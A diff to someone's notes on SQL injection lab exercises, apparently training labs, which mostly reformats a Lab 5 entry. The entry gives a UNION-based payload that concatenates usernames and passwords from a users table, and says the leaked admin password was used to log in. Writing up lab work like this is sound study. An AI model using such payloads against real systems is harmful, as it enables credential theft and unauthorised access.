@@ -36,9 +36,9 @@ Found administrator's password in the results, logged in as admin.
 Complete UNION SQLi attack chain: injection → data extraction → privilege escalation.
 
 ## Lab 5 — Retrieving multiple values within a single column
-Used NULL,username||'~'||password FROM users-- when the query only had
+Used NULL,username||'\~'||password FROM users-- when the query only had
 one usable column for output.
-|| is Oracle's string concat operator, joins username and password together.
-~ separator splits the two values apart in the output for easy reading.
-Payload: ' UNION SELECT NULL,username||'~'||password FROM users--
-Leaked output as administrator~<password>, logged in as admin.
+`||` is Oracle's string concat operator, joins username and password together.
+`\~` separator splits the two values apart in the output for easy reading.
+Payload: ' UNION SELECT NULL,username||'\~'||password FROM users--
+Leaked output as administrator\~<password>, logged in as admin.
